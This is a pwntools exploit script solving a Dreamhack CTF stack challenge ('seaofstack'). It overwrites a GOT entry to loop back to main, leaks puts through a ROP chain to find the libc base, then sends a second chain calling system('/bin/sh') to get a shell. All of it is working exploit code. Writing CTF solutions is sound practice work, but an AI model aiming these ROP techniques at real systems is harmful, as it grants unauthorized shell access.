from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/seaofstack/deploy/prob')
libc = ELF('/home/kali/Downloads/dreamhack/seaofstack/deploy/libc.so.6')
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:21304'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p)
    
puts_got = elf.got[b'puts']
puts_plt = elf.plt[b'puts']
main = 0x401446
unsafe = 0x401426

addr1 = p64(0x404010)
val = p32(main)

p.recvuntil(b"> ")
p.sendline(b"Decision2Solve\x00")

sleep(1)

#must be 8 len
p.send(addr1)
#must be 6 len
p.send(val + b'\x00' * 2)

#safe -> return to main
#do this a thousand times i guess
print('sup')
for i in range(0, 0x400):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    
    p.recvuntil(b"> ")
    p.send(b"A"*16)
    print(f"i is {i}")

#have 0x10000 bytes into v1
#40129b: pop rdi; nop; pop rbp; ret; 

p.recvuntil(b"> ")
p.sendline(b"2")

pop_rdi_nop_pop_rbp_ret = 0x40129b
payload = ( b"A" * 32 +
            b"B" * 8 +
            p64(pop_rdi_nop_pop_rbp_ret) +
            p64(puts_got) +
            b"B"* 8 + 
            p64(puts_plt) +
            p64(unsafe)
          )
          
payload = payload.ljust(0x10000, b"\x90")
p.send(payload) 

data = p.recvline().strip()
val =  u64(data.ljust(8, b"\x00"))

libc.address = val - libc.sym[b'puts']
print(hex(libc.address))

#takes too long to bother checking one gadgets
#ret back to unsafe_func not main bc we fucked the registers
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))

ret = 0x40101a
payload = ( b"A" * 32 +
            b"B" * 8 +
            p64(pop_rdi_nop_pop_rbp_ret) +
            p64(binsh) +
            b"C"*8 +
            p64(ret) +
            p64(system) 
          )
          
payload = payload.ljust(0x10000, b"\x90")
p.send(payload) 

p.interactive()
